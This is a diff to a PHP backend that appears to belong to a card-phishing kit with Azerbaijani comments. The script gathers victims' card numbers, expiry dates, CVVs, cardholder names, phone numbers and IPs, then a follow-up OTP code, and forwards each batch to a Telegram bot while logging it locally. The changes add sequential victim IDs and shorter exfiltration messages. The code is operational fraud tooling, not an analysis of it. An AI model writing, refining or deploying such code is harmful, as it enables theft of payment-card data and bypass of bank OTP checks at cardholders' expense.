@@ -21,7 +21,16 @@ $ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : $_SERVER['REMOTE_AD
 $otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : '';
 $campaign = isset($_POST['campaign']) ? trim(strip_tags($_POST['campaign'])) : '';
 
-$id = rand(1000, 9999);
+// ============================================
+// 🔢 SIRALI ID - COUNTER FAYLINDAN OXU
+// ============================================
+$counterFile = 'counter.txt';
+if (file_exists($counterFile)) {
+    $id = (int)file_get_contents($counterFile) + 1;
+} else {
+    $id = 1;
+}
+file_put_contents($counterFile, $id);
 
 // ============================================
 // 📤 TELEGRAM-A GÖNDƏRME FUNKSİYASI
@@ -52,66 +61,55 @@ function sendToTelegram($message) {
 }
 
 // ============================================
-// 📝 1-Cİ MESAJ: YALNIZ KART MƏLUMATLARI
+// 📝 1-Cİ MESAJ: KART MƏLUMATLARI (QISA)
 // ============================================
 if (empty($otp)) {
-    $message1 = "═══════════════════════════════════\n";
-    $message1 .= "      💳 YENİ KART GİRİŞİ      \n";
-    $message1 .= "═══════════════════════════════════\n\n";
-    
-    $message1 .= "🆔 ID: #" . $id . "\n";
+    $message1 = "💳 YENİ KART GİRİŞİ #" . $id . "\n";
+    $message1 .= "────────────────────────\n";
     $message1 .= "📞 Tel: " . $phone . "\n";
-    $message1 .= "💰 Tutar: " . $amount . " AZN\n\n";
-    
+    $message1 .= "💰 Tutar: " . $amount . " AZN\n";
     $message1 .= "💳 CC: " . $cardNumber . "\n";
     $message1 .= "📅 Tarix: " . $cardExpiry . "\n";
     $message1 .= "🔐 CVV: " . $cardCvv . "\n";
-    $message1 .= "👤 İsim: " . $cardName . "\n\n";
-    
+    $message1 .= "👤 İsim: " . $cardName . "\n";
     $message1 .= "🌐 IP: " . $ip . "\n";
-    $message1 .= "═══════════════════════════════════";
+    $message1 .= "────────────────────────";
     
     sendToTelegram($message1);
     
-    // LOG
-    $logData = date('Y-m-d H:i:s') . " | ID: #$id | KART GÖNDƏRİLDİ | IP: $ip\n";
+    $logData = date('Y-m-d H:i:s') . " | ID: #$id | KART | IP: $ip\n";
     file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
     
     header('Content-Type: application/json');
-    echo json_encode(['status' => 'success', 'message' => '✅ Kart məlumatları göndərildi!']);
+    echo json_encode(['status' => 'success']);
     exit;
 }
 
 // ============================================
-// 📝 2-Cİ MESAJ: OTP + PAKET MƏLUMATLARI
+// 📝 2-Cİ MESAJ: OTP + PAKET (QISA)
 // ============================================
 if (!empty($otp)) {
-    $message2 = "═══════════════════════════════════\n";
-    $message2 .= "      🔑 OTP TƏSDİQİ      \n";
-    $message2 .= "═══════════════════════════════════\n\n";
-    
-    $message2 .= "🔑 OTP Kodu: " . $otp . "\n";
+    $message2 = "🔑 OTP TƏSDİQİ #" . $id . "\n";
+    $message2 .= "────────────────────────\n";
+    $message2 .= "🔑 OTP: " . $otp . "\n";
     $message2 .= "🌐 IP: " . $ip . "\n";
     if (!empty($campaign)) {
         $message2 .= "📦 Paket: " . $campaign . "\n";
     }
-    $message2 .= "───────────────────────────────\n";
-    $message2 .= "📱 Bağlı Nömrə: " . $phone . "\n";
-    $message2 .= "═══════════════════════════════════";
+    $message2 .= "📱 Nömrə: " . $phone . "\n";
+    $message2 .= "────────────────────────";
     
     sendToTelegram($message2);
     
-    // LOG
     $logData = date('Y-m-d H:i:s') . " | ID: #$id | OTP: $otp | IP: $ip\n";
     file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
     
     header('Content-Type: application/json');
-    echo json_encode(['status' => 'success', 'message' => '✅ OTP təsdiqləndi!']);
+    echo json_encode(['status' => 'success']);
     exit;
 }
 
-// HEÇ BİR MƏLUMAT YOXDURSA
 header('Content-Type: application/json');
-echo json_encode(['status' => 'error', 'message' => '❌ Məlumat tapılmadı!']);
+echo json_encode(['status' => 'error']);
 exit;
 ?>
